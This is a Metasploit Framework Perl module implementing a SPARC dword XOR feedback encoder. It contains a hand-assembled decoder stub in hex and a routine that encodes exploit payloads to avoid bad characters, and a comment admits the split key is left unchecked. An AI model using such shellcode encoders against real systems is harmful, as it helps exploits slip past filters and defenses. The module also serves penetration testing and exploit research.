
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Encoder::Sparc;
use strict;
use base 'Msf::Encoder';
use Pex::Encoder;

my $advanced = 
{

};

my $info = {
    'Name'    => 'Sparc DWord Xor Encoder',
    'Version' => '1.0',
    'Authors' => [ 'optyx <optyx@uberhax0r.net>' ],
    'Arch'    => [ 'sparc' ],
    'OS'      => [ ],
    'Description'  =>  "<optyx> fucking xor decoder 48 bytes, cache safe",
    'Refs'    => [ ],
};

sub new {
    my $class = shift; 
    return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
}

sub EncodePayload {
    my $self     = shift;
    my $payload  = shift;
    my $badchars = shift;

    my $xor_key   = Pex::Encoder::KeyScanXorDwordFeedback($payload, $badchars);
    my $xor_data  = Pex::Encoder::XorDwordFeedback($xor_key, $payload);

    my $encoder = 
        "\x20\xbf\xff\xff".   # /* bn,a  _start - 4 */
        "\x20\xbf\xff\xff".   # /* bn,a  _start     */
        "\x7f\xff\xff\xff".   # /* call  _start + 4 */
        "\x2f\x10\x50\x50".   # /* sethi %hi(0x41414141),%l7 */
        "\xae\x15\xe1\x41".   # /* or    %l7,%lo(0x41414141),%l7 */
        "\x9e\x03\xe0\x24".   # /* add   %o7,0x24,%o7 */
        "\xea\x03\xe0\x04".   # /* ld    [%o7 + 4],%l7 */
        "\xaa\x9d\x40\x17".   # /* xorcc %l5,%l7,%l5 */
        "\xea\x23\xe0\x04".   # /* st    %l5,[%o7 + 4] */
        "\xae\x05\xc0\x15".   # /* add   %l7,%l5,%l7 */
        "\x12\xbf\xff\xfc".   # /* bnz   dec_loop */
        "\x9e\x03\xe0\x04";   # /* add   %o7,4,%o7 */
    
    # Extract
    my $hiData = unpack('N', substr($encoder, 16, 4));
    my $loData = unpack('N', substr($encoder, 20, 4));
	
    # Patch
    $hiData = (($hiData >> 22) << 22) + ($xor_key >> 10);
    $loData = (($loData >> 10) << 10) + (($xor_key << 22) >> 22);
    
    # Replace
    substr($encoder, 16, 4, pack('N', $hiData));
    substr($encoder, 20, 4, pack('N', $loData));
  
    # XXX - We do not check to see if the split bitshifted key is a badchar!
	return $encoder . $xor_data . pack('N', $xor_key); 
}

1;
